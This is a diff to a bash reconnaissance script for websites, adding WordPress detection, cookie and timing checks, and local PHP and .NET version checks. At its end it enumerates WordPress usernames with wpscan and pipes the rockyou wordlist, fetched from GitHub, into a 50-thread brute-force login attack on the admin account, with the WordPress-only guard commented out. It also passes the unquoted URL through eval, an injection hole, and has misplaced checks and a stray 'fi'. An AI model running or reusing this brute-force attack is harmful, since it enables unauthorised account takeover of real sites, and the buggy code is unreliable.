@@ -17,6 +17,17 @@ else
     exit 1
 fi
 
+# Check if the website is a WordPress site
+echo "Checking if $url is a WordPress site..."
+wp_check=$(curl -s $url/wp-includes/version.php | grep -i "wp_version\|doctype html")
+if [[ $wp_check == *"wp_version"* ]]; then
+    echo "$url is a WordPress site."
+    is_wordpress=true
+else
+    echo "$url is not a WordPress site."
+    is_wordpress=false
+fi
+
 server=$(curl -I $url | grep 'Server:' | awk '{print $2}')
 ip=$(curl -s $url | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -n 1)
 location=$(dig -x $ip +short)
@@ -114,17 +125,23 @@ printf '\n************\n* Page Speed and Performance Metrics *\n************\n\n
 curl -o /dev/null -s -w "Connect time: %{time_connect}\nStart transfer time: %{time_starttransfer}\nTotal time: %{time_total}\nHTTP response code: %{http_code}\nSize: %{size_download} bytes\n" $url
 
 
+echo -e "\n************\n* Server-side Scripting Languages *\n************\n\n"
 
-printf '\n************\n* Social Media Links *\n************\n\n'
-
-
-echo "Searching for social media links on the website..."
-social_links=$(curl -s $url | grep -oE '(https?:\/\/(www\.)?(facebook|twitter|instagram|linkedin)\.com\/\S+)')
-if [[ -n "$social_links" ]]; then
-    echo "The following social media links were found on the website:"
-    echo "$social_links"
+# Check if PHP is installed and get its version
+if [[ $(command -v php) ]]; then
+    php_version=$(php -v | awk '/^PHP/ {print $2}')
+    echo "PHP $php_version is installed."
 else
-    echo "No social media links were found on the website."
+    echo "PHP is not installed."
+fi
+
+
+# Check if ASP.NET is installed and get its version
+if [[ $(command -v dotnet) ]]; then
+    dotnet_version=$(dotnet --version)
+    echo "ASP.NET $dotnet_version is installed."
+else
+    echo "ASP.NET is not installed."
 fi
 
 
@@ -222,3 +239,44 @@ wp_plugins=$(curl -s -L $url/wp-admin/plugins.php | grep -o -E '<span class="plu
         echo "No WordPress plugins detected."
     fi
 
+# Get cookie information
+echo -e "\n************\n* Website Cookies *\n************\n\n"
+cmd="curl -I -s $url | grep 'Set-Cookie:'"
+result=$(eval "$cmd")
+if [ -z "$result" ]; then
+    echo "No cookies found on the website."
+else
+    echo "Cookies found on the website:"
+    echo "$result"
+fi
+
+# Get page speed and performance metrics
+echo -e "\n************\n* Page Speed and Performance Metrics *\n************\n\n"
+cmd="curl -o /dev/null -s -w \"Connect time: %{time_connect}\nStart transfer time: %{time_starttransfer}\nTotal time: %{time_total}\nHTTP response code: %{http_code}\nSize: %{size_download} bytes\n\" $url"
+result=$(eval "$cmd")
+echo "$result"
+
+echo -e "\n************\n* WordPress Usernames *\n************\n\n"
+wpscan --url $url --enumerate u
+
+# Check if wpscan is installed
+if ! command -v wpscan &> /dev/null
+then
+    echo "wpscan is not installed. Please install wpscan before running this script."
+    echo "To install wpscan, run the following command:"
+    echo "sudo gem install wpscan"
+    exit 1
+fi
+
+# Run wpscan if the website is a WordPress site
+# if [[ $is_wordpress == true ]]; then
+    echo -e "\n************\n* WordPress Passwords *\n************\n\n"
+    if [[ $(command -v wpscan) ]]; then
+        mkfifo wpscan_pipe
+        curl -s https://raw.githubusercontent.com/brannondorsey/naive-hashcat/master/rockyou.txt > wpscan_pipe &
+        wpscan --url $url --usernames admin --passwords wpscan_pipe --threads 50 --wp-content-dir wp-content --max-threads 50
+        rm wpscan_pipe
+    else
+        echo "wpscan is not installed. Install it from https://wpscan.com/wordpress-security-scanner."
+    fi
+fi
